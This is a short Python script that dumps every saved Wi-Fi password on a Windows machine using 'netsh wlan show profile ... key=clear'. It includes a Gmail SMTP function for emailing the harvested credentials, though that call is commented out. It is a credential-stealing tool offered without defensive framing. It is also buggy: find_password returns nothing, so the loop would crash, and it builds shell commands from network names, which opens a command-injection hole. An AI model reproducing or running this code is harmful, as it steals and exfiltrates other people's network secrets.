import subprocess, smtplib, re

network_profile = 'IUPC723762'
profile_command = 'netsh wlan show profile '

email = ""
passwd = ""

def send_mail(email,passwd,content):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,passwd)
    server.sendmail(email,email, content)
    server.quit()

def find_password(network_name):
    password_command = profile_command + network_name   + ' key=clear'
    current_res = subprocess.check_output(password_command, shell = True)

    print(network_name)

def capture_and_send():
    networks = subprocess.check_output(profile_command, shell=True)
    network_names_list = re.findall('(?:Profile\s*:\s)(.*)',networks.decode())
    result = ''
    for network_name in network_names_list:
        result = result + network_name + ' : ' + find_password(network_name) + ' \n'

    print(result)
    #send_mail(email,passwd, result )

if __name__ == '__main__':
    capture_and_send()

